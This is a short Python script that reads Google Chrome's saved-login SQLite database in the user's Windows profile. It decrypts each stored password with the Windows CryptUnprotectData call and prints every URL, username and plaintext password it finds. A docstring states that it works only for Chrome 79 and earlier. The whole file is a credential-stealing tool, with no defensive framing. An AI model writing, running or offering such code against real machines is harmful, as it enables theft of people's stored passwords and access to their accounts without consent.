import os
import sqlite3

import win32crypt

"""
Only works for Chrome version 79 and earlier (pre-2020)
Chrome stored passwords in a SQLite database
User passwords were encrypted using the OS login password
"""

userdir = os.path.expanduser("~")
chromepath = os.path.join(
    userdir,
    "AppData",
    "Local",
    "Google",
    "Chrome",
    "User Data",
    "Default",
    "Login Data",
)

conn = sqlite3.connect(chromepath)
c = conn.cursor()
c.execute("SELECT origin_url, username_value, password_value FROM logins;")

login_data = c.fetchall()
for URL, username, password in login_data:
    print(password)
    pwd = win32crypt.CryptUnprotectData(password)
    print("%s, %s, %s" % (URL, username, pwd))
